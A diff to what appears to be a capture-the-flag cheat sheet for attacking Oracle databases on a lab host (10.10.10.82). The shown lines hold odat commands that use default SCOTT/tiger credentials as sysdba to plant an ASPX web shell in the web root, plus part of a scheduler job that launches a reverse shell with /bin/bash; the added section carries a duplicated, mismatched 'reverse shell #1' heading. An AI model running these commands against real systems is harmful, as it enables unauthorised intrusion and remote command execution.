@@ -159,7 +159,7 @@ scott/tiger
 **Upload shell**
 
 ```text
-find vulnarable prosucers:
+find vulnarable modules:
 odat all -s 10.10.10.82 -d XE -U SCOTT -P tiger --sysdba
 
 upload shell:
@@ -423,7 +423,7 @@ sqlplus SCOTT/tiger@10.10.10.82:1521/XE as sysdba
 
 `drop index exploit_1337;` 
 
-## reverse shell
+## reverse shell \#1
 
 ```text
 Get Oracle Reverse os-shell:
@@ -437,6 +437,17 @@ dbms_scheduler.set_job_argument_value('rev_shell', 3, '-e');
 dbms_scheduler.set_job_argument_value('rev_shell', 4, '/bin/bash');
 dbms_scheduler.enable('rev_shell'); 
 end; 
+```
+
+## reverse shell \#1
+
+```text
+find vulnarable modules:
+odat all -s 10.10.10.82 -d XE -U SCOTT -P tiger --sysdba
+
+upload shell:
+./odat-libc2.12-x86_64 dbmsadvisor -s 10.10.10.82 -d XE -U SCOTT -P tiger --sysdba --putFile C:\\inetpub\\wwwroot 0xdf.aspx /usr/share/webshells/aspx/cmdasp.aspx
+
 ```
 
 ## Resources:
